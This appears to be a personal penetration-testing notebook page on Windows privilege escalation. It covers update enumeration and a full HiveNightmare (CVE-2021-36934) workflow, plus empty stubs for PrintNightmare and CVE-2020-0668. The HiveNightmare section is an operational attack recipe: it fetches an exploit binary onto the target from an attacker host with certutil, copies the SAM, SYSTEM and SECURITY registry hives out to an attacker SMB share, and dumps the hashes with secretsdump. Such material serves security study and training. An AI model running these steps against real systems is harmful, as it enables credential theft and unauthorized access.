---
Primary_category: "[[WINDOWS PRIVESC]]"
title: WINDOWS KERNEL ABUSE
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Enumeration*

##### *Listing Installed Updates*

> ***CMD & PS***

```bash
systeminfo
wmic qfe list brief
```

> ***PS***

```bash
Get-Hotfix
Get-CimInstance -ClassName win32_quickfixengineering -Property *
```

##### *Getting Information about an specific KB*

> ***[Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx)***

---

#### *HiveNightmare ( a.k.a SeriousSam )*

> ***[CVE-2021-36934](https://nvd.nist.gov/vuln/detail/cve-2021-36934)***

##### *Workflow*

This is a really simple security flaw which allows any authenticated user to have *READ* permissions over the entire *Windows* registry, therefore having access to sensitive information, such as the one contained within both ***[[SAM & SECURITY#SAM|SAM]]*** and ***[[SAM & SECURITY#Security (LSA Secrets)|SECURITY]]*** hives

As is well known, those sensitive files are locked out by the system, so even if there is a *DACL*  misconfiguration that grants *READ* privileges to the *BUILTIN\Users* group, they can be read

However, an operator could leverage the *VSS Volume Shadow Copy ( System Protection )* in order to retrieve a copy of those files and then proceed with an offline data extraction

##### *Requirements*

- ***The Windows System must be vulnerable***

> ***Windows 10 1809 build and higher***

- ***System Protection Feature Enabled ( VSS Copies )***

- ***Presence of at least one Restoration Checkpoint***

##### *Abuse - Windows*

###### *Checking Permissions on Sensitive Files*

> ***CMD & PS***

```bash
icacls 'C:\Windows\System32\config\SAM'
icacls 'C:\Windows\System32\config\SECURITY'
icacls 'C:\Windows\System32\config\SYSTEM'
```

> ***PS***

```bash
Get-Item 'C:\Windows\System32\config\SAM', 'C:\Windows\System32\config\SECURITY', 'C:\Windows\System32\config\SYSTEM' | Get-ACL | Select -ExpandProperty accessToString
```

###### *Retrieving Sensitive Files from VSS Copy carried out by System Protection*

> ***[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)***

- ***Setup***

***Downloading the script***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe'
```

***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/HiveNightmare.exe'
```

- ***Usage***

```bash
.\HiveNightmare.exe
```

###### *Transferring copies of sensitives files to the attacker*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE_NAME>' '<LOCAL_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> smbserver.py -smb2support -user '4l3xbb' -password '4l3xbb' 'smbFolder' "$( pwd )"
> ```
>

> ***From the target*** 🎯

```bash
net use X: \\<ATTACKER_IP>\<SHARE> /USER:<USER> '<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net use X: \\10.10.15.63\smbFolder /USER:4l3xbb '4l3xbb'
> ```
>

```bash
Copy-Item -Path '.\SAM-<YYYY-MM-DD>', '.\SYSTEM-<YYYY-MM-DD>', '.\SECURITY-<YYYY-MM-DD>' -Destination 'X:\'
```

###### *Offline Hash Extraction*

> ***From the attacker*** ⚔️

> ***[Impacket's Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -sam ./SAM-<YYYY-MM-DD> -system .\SYSTEM-<YYYY-MM-DD> -security ./SECURITY-<YYYY-MM-DD> LOCAL
```

---

#### *PrintNightmare*

> ***[CVE-2021-1675]()***

> ***[CVE-2021-34527]()***

***See [[PRINTNIGHTMARE#Code Execution as LOCAL SYSTEM|PrintNightmare: Code Execution as LOCAL SYSTEM]]***

---

#### *CVE-2020-0668*

> ***[CVE-2020-0668]()***

##### *Workflow*

##### *Requirements*

##### *Abuse - Windows*

---
#### *Resources*

***[Microsoft Update Guide](https://msrc.microsoft.com/update-guide/vulnerability)***